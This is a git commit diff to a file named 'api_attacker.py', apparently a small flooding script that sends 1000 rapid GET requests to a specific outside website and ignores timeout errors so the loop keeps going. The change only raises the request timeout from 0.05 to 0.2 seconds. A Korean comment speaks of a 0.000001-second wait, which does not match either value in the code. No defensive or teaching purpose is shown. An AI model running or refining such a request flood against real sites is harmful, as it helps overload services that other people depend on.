ba52c4954f88e736db55e87fded91b8ca4f96af5
Skotle <66015632+Skotle@users.noreply.github.com>
2026-05-18 17:31:19 +0900

    source 0

--- api_attacker.py
+++ api_attacker.py
@@ -5,7 +5,7 @@ key = "https://irisen25.com"
 for x in range(1000):
     try:
         # 0.000001초만 기다리고 바로 에러를 발생시켜 다음 코드로 진행
-        requests.get(key, timeout=0.05)
+        requests.get(key, timeout=0.2)
     except requests.exceptions.ReadTimeout:
         # 타임아웃 에러가 나더라도 무시하고 진행
         pass
